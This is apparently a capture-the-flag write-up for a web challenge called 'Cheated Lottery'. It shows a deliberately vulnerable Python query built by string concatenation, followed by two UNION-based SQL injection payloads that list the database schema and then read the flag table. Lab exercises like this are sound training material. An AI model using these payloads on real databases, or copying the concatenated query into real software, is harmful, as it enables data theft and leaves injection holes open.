# Cheated Lottery

I am trying to win this stupid lottery but with no success for a long time...I have to try one more time, I've got new coupon - maybe this is the one? Who knows, maybe I'll win something more than expected?

## Challenge

Flag is stored in `c2VjcmV0LWRi` database - you need to read it using SQLi

To run this you have to change flag in `entrypoint.sh` and build a docker image. Server will be exposed on port 7331

## Solution

You can see python code by accessing `/?source=1`

Vulnerable piece of code:
```python
mycursor.execute("SELECT * FROM coupons WHERE code = '" + str(form['cid']) + "'")
```

1. SQL: 
```sql
' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND ''='
```

2. SQL: 
```sql
' UNION SELECT 1,ZGVmaW5pdGVseS1ub3QtZmxhZw,2 FROM c2VjcmV0LWRi WHERE ''='
```
